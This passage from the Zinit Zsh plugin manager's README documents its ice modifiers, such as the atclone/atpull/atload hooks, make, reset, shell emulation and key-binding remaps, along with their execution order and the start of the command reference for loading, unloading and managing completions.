&lt;h3&gt;&lt;a id="user-content-completions" class="anchor" aria-hidden="true" href="#completions"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Completions&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="center"&gt;Modifier&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;blockf&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Disallow plugin to modify &lt;code&gt;fpath&lt;/code&gt;. Useful when a plugin wants to provide completions in traditional way. Zinit can manage completions and plugin can be blocked from exposing them.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;nocompletions&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Don't detect, install and manage completions for this plugin. Completions can be installed later with &lt;code&gt;zinit creinstall {plugin-spec}&lt;/code&gt;.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;&lt;a id="user-content-command-execution-after-cloning-updating-or-loading" class="anchor" aria-hidden="true" href="#command-execution-after-cloning-updating-or-loading"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Command Execution After Cloning, Updating or Loading&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="center"&gt;Modifier&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;mv&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Move file after cloning or after update (then, only if new commits were downloaded). Example: &lt;code&gt;mv "fzf-* -&amp;gt; fzf"&lt;/code&gt;. It uses &lt;code&gt;-&amp;gt;&lt;/code&gt; as separator for old and new file names. Works also with snippets.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;cp&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Copy file after cloning or after update (then, only if new commits were downloaded). Example: &lt;code&gt;cp "docker-c* -&amp;gt; dcompose"&lt;/code&gt;. Ran after &lt;code&gt;mv&lt;/code&gt;.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;a href="http://zdharma.org/zinit/wiki/atload-and-other-at-ices" rel="nofollow"&gt;&lt;strong&gt;&lt;code&gt;atclone&lt;/code&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Run command after cloning, within plugin's directory, e.g. &lt;code&gt;zinit ice atclone"echo Cloned"&lt;/code&gt;. Ran also after downloading snippet.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;a href="http://zdharma.org/zinit/wiki/atload-and-other-at-ices" rel="nofollow"&gt;&lt;strong&gt;&lt;code&gt;atpull&lt;/code&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Run command after updating (&lt;strong&gt;only if new commits are waiting for download&lt;/strong&gt;), within plugin's directory. If starts with "!" then command will be ran before &lt;code&gt;mv&lt;/code&gt; &amp;amp; &lt;code&gt;cp&lt;/code&gt; ices and before &lt;code&gt;git pull&lt;/code&gt; or &lt;code&gt;svn update&lt;/code&gt;. Otherwise it is ran after them. Can be &lt;code&gt;atpull'%atclone'&lt;/code&gt;, to repeat &lt;code&gt;atclone&lt;/code&gt; Ice-mod.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;a href="http://zdharma.org/zinit/wiki/atload-and-other-at-ices" rel="nofollow"&gt;&lt;strong&gt;&lt;code&gt;atinit&lt;/code&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Run command after directory setup (cloning, checking it, etc.) of plugin/snippet but before loading.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;a href="http://zdharma.org/zinit/wiki/atload-and-other-at-ices" rel="nofollow"&gt;&lt;strong&gt;&lt;code&gt;atload&lt;/code&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Run command after loading, within plugin's directory. Can be also used with snippets. Passed code can be preceded with &lt;code&gt;!&lt;/code&gt;, it will then be tracked (if using &lt;code&gt;load&lt;/code&gt;, not &lt;code&gt;light&lt;/code&gt;).&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;run-atpull&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Always run the atpull hook (when updating), not only when there are new commits to be downloaded.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;nocd&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Don't switch the current directory into the plugin's directory when evaluating the above ice-mods &lt;code&gt;atinit''&lt;/code&gt;,&lt;code&gt;atload''&lt;/code&gt;, etc.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;a href="http://zdharma.org/zinit/wiki/Installing-with-make" rel="nofollow"&gt;&lt;strong&gt;&lt;code&gt;make&lt;/code&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Run &lt;code&gt;make&lt;/code&gt; command after cloning/updating and executing &lt;code&gt;mv&lt;/code&gt;, &lt;code&gt;cp&lt;/code&gt;, &lt;code&gt;atpull&lt;/code&gt;, &lt;code&gt;atclone&lt;/code&gt; Ice mods. Can obtain argument, e.g. &lt;code&gt;make"install PREFIX=/opt"&lt;/code&gt;. If the value starts with &lt;code&gt;!&lt;/code&gt; then &lt;code&gt;make&lt;/code&gt; is ran before &lt;code&gt;atclone&lt;/code&gt;/&lt;code&gt;atpull&lt;/code&gt;, e.g. &lt;code&gt;make'!'&lt;/code&gt;.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;countdown&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt;Causes an interruptable (by Ctrl-C) countdown 5…4…3…2…1…0 to be displayed before executing &lt;code&gt;atclone''&lt;/code&gt;,&lt;code&gt;atpull''&lt;/code&gt; and &lt;code&gt;make&lt;/code&gt; ices&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;reset&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt;Invokes &lt;code&gt;git reset --hard HEAD&lt;/code&gt; for plugins or &lt;code&gt;svn revert&lt;/code&gt; for SVN snippets before pulling any new changes. This way &lt;code&gt;git&lt;/code&gt; or &lt;code&gt;svn&lt;/code&gt; will not report conflicts if some changes were done in e.g.: &lt;code&gt;atclone''&lt;/code&gt; ice. For file snippets and &lt;code&gt;gh-r&lt;/code&gt; plugins it invokes &lt;code&gt;rm -rf *&lt;/code&gt;.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;&lt;a id="user-content-sticky-emulation-of-other-shells" class="anchor" aria-hidden="true" href="#sticky-emulation-of-other-shells"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Sticky-Emulation Of Other Shells&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="center"&gt;Modifier&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;sh&lt;/code&gt;, &lt;code&gt;!sh&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt;Source the plugin's (or snippet's) script with &lt;code&gt;sh&lt;/code&gt; emulation so that also all functions declared within the file will get a &lt;em&gt;sticky&lt;/em&gt; emulation assigned – when invoked they'll execute also with the &lt;code&gt;sh&lt;/code&gt; emulation set-up. The &lt;code&gt;!sh&lt;/code&gt; version switches additional options that are rather not important from the portability perspective.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;bash&lt;/code&gt;, &lt;code&gt;!bash&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt;The same as &lt;code&gt;sh&lt;/code&gt;, but with the &lt;code&gt;SH_GLOB&lt;/code&gt; option disabled, so that Bash regular expressions work.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;ksh&lt;/code&gt;, &lt;code&gt;!ksh&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt;The same as &lt;code&gt;sh&lt;/code&gt;, but emulating &lt;code&gt;ksh&lt;/code&gt; shell.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;csh&lt;/code&gt;, &lt;code&gt;!csh&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt;The same as &lt;code&gt;sh&lt;/code&gt;, but emulating &lt;code&gt;csh&lt;/code&gt; shell.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;&lt;a id="user-content-others" class="anchor" aria-hidden="true" href="#others"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Others&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="center"&gt;Modifier&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;as&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Can be &lt;code&gt;as"program"&lt;/code&gt; (also the alias: &lt;code&gt;as"command"&lt;/code&gt;), and will cause to add script/program to &lt;code&gt;$PATH&lt;/code&gt; instead of sourcing (see &lt;code&gt;pick&lt;/code&gt;). Can also be &lt;code&gt;as"completion"&lt;/code&gt; – use with plugins or snippets in whose only underscore-starting &lt;code&gt;_*&lt;/code&gt; files you are interested in. The third possible value is &lt;code&gt;as"null"&lt;/code&gt; – a shorthand for &lt;code&gt;pick"/dev/null" nocompletions&lt;/code&gt; – i.e.: it disables the default script-file sourcing and also the installation of completions.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;a href="http://zdharma.org/zinit/wiki/id-as/" rel="nofollow"&gt;&lt;strong&gt;&lt;code&gt;id-as&lt;/code&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Nickname a plugin or snippet, to e.g. create a short handler for long-url snippet.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;compile&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Pattern (+ possible &lt;code&gt;{...}&lt;/code&gt; expansion, like &lt;code&gt;{a/*,b*}&lt;/code&gt;) to select additional files to compile, e.g. &lt;code&gt;compile"(pure|async).zsh"&lt;/code&gt; for &lt;code&gt;sindresorhus/pure&lt;/code&gt;.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;nocompile&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Don't try to compile &lt;code&gt;pick&lt;/code&gt;-pointed files. If passed the exclamation mark (i.e. &lt;code&gt;nocompile'!'&lt;/code&gt;), then do compile, but after &lt;code&gt;make''&lt;/code&gt; and &lt;code&gt;atclone''&lt;/code&gt; (useful if Makefile installs some scripts, to point &lt;code&gt;pick''&lt;/code&gt; at the location of their installation).&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;service&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Make following plugin or snippet a &lt;em&gt;service&lt;/em&gt;, which will be ran in background, and only in single Zshell instance. See &lt;a href="https://github.com/zservices"&gt;zservices-organization&lt;/a&gt; page.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;reset-prompt&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Reset the prompt after loading the plugin/snippet (by issuing &lt;code&gt;zle .reset-prompt&lt;/code&gt;). Note: normally it's sufficient to precede the value of &lt;code&gt;wait''&lt;/code&gt; ice with &lt;code&gt;!&lt;/code&gt;.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;bindmap&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; To hold &lt;code&gt;;&lt;/code&gt;-separated strings like &lt;code&gt;Key(s)A -&amp;gt; Key(s)B&lt;/code&gt;, e.g. &lt;code&gt;^R -&amp;gt; ^T; ^A -&amp;gt; ^B&lt;/code&gt;. In general, &lt;code&gt;bindmap''&lt;/code&gt;changes bindings (done with the &lt;code&gt;bindkey&lt;/code&gt; builtin) the plugin does. The example would cause the plugin to map Ctrl-T instead of Ctrl-R, and Ctrl-B instead of Ctrl-A. &lt;strong&gt;Does not work with snippets.&lt;/strong&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;trackbinds&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Shadow but only &lt;code&gt;bindkey&lt;/code&gt; calls even with &lt;code&gt;zinit light ...&lt;/code&gt;, i.e. even with tracking disabled (fast loading), to allow &lt;code&gt;bindmap&lt;/code&gt; to remap the key-binds. The same effect has &lt;code&gt;zinit light -b ...&lt;/code&gt;, i.e. additional &lt;code&gt;-b&lt;/code&gt; option to the &lt;code&gt;light&lt;/code&gt;-subcommand. &lt;strong&gt;Does not work with snippets.&lt;/strong&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;a href="http://zdharma.org/zinit/wiki/wrap-track" rel="nofollow"&gt;&lt;strong&gt;&lt;code&gt;wrap-track&lt;/code&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Takes a &lt;code&gt;;&lt;/code&gt;-separated list of function names that are to be tracked (meaning gathering report and unload data) &lt;strong&gt;once&lt;/strong&gt; during execution. It works by wrapping the functions with a tracking-enabling and disabling snippet of code. In summary, &lt;code&gt;wrap-track&lt;/code&gt; allows to extend the tracking beyond the moment of loading of a plugin. Example use is to &lt;code&gt;wrap-track&lt;/code&gt; a precmd function of a prompt (like &lt;code&gt;_p9k_precmd()&lt;/code&gt; of powerlevel10k) or other plugin that &lt;em&gt;postpones its initialization till the first prompt&lt;/em&gt; (like e.g.: zsh-autosuggestions). &lt;strong&gt;Does not work with snippets.&lt;/strong&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;aliases&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt;Load the plugin with the aliases mechanism enabled. Use with plugins that define &lt;strong&gt;and use&lt;/strong&gt; aliases in their scripts.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;light-mode&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt;Load the plugin without the tracking, i.e.: as if it would be loaded with the &lt;code&gt;light&lt;/code&gt; command. Useful for the for-syntax, where there is no &lt;code&gt;load&lt;/code&gt; nor &lt;code&gt;light&lt;/code&gt; subcommand&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;&lt;a id="user-content-order-of-execution" class="anchor" aria-hidden="true" href="#order-of-execution"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Order of Execution&lt;/h3&gt;
&lt;p&gt;Order of execution of related Ice-mods: &lt;code&gt;atinit&lt;/code&gt; -&amp;gt; &lt;code&gt;atpull!&lt;/code&gt; -&amp;gt; &lt;code&gt;make'!!'&lt;/code&gt; -&amp;gt; &lt;code&gt;mv&lt;/code&gt; -&amp;gt; &lt;code&gt;cp&lt;/code&gt; -&amp;gt; &lt;code&gt;make!&lt;/code&gt; -&amp;gt; &lt;code&gt;atclone&lt;/code&gt;/&lt;code&gt;atpull&lt;/code&gt; -&amp;gt; &lt;code&gt;make&lt;/code&gt; -&amp;gt; &lt;code&gt;(plugin script loading)&lt;/code&gt; -&amp;gt; &lt;code&gt;src&lt;/code&gt; -&amp;gt; &lt;code&gt;multisrc&lt;/code&gt; -&amp;gt; &lt;code&gt;atload&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-zinit-commands" class="anchor" aria-hidden="true" href="#zinit-commands"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Zinit Commands&lt;/h2&gt;
&lt;p&gt;Following commands are passed to &lt;code&gt;zinit ...&lt;/code&gt; to obtain described effects.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-help" class="anchor" aria-hidden="true" href="#help"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Help&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="center"&gt;Command&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;-h, --help, help&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Usage information.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;man&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Manual.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;&lt;a id="user-content-loading-and-unloading" class="anchor" aria-hidden="true" href="#loading-and-unloading"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Loading and Unloading&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="center"&gt;Command&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;load {plg-spec}&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Load plugin, can also receive absolute local path.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;light [-b] {plg-spec}&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Light plugin load, without reporting/tracking. &lt;code&gt;-b&lt;/code&gt; – track &lt;code&gt;bindkey&lt;/code&gt;-calls only. There's also &lt;code&gt;light-mode&lt;/code&gt; ice which can be used to induce the no-tracking (i.e.: &lt;em&gt;light&lt;/em&gt;) loading, regardless of the command used.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;unload [-q] {plg-spec}&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Unload plugin loaded with &lt;code&gt;zinit load ...&lt;/code&gt;. &lt;code&gt;-q&lt;/code&gt; – quiet.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;snippet [-f] {url}&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Source local or remote file (by direct URL). &lt;code&gt;-f&lt;/code&gt; – don't use cache (force redownload).&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;&lt;a id="user-content-completions-1" class="anchor" aria-hidden="true" href="#completions-1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Completions&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="center"&gt;Command&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt; clist [&lt;em&gt;columns&lt;/em&gt;], completions [&lt;em&gt;columns&lt;/em&gt;] &lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; List completions in use, with &lt;code&gt;&lt;em&gt;columns&lt;/em&gt;&lt;/code&gt; completions per line. &lt;code&gt;zpl clist 5&lt;/code&gt; will for example print 5 completions per line. Default is 3.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;cdisable {cname}&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Disable completion &lt;code&gt;cname&lt;/code&gt;.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;cenable {cname}&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Enable completion &lt;code&gt;cname&lt;/code&gt;.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;creinstall [-q] {plg-spec}&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Install completions for plugin, can also receive absolute local path. &lt;code&gt;-q&lt;/code&gt; – quiet.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
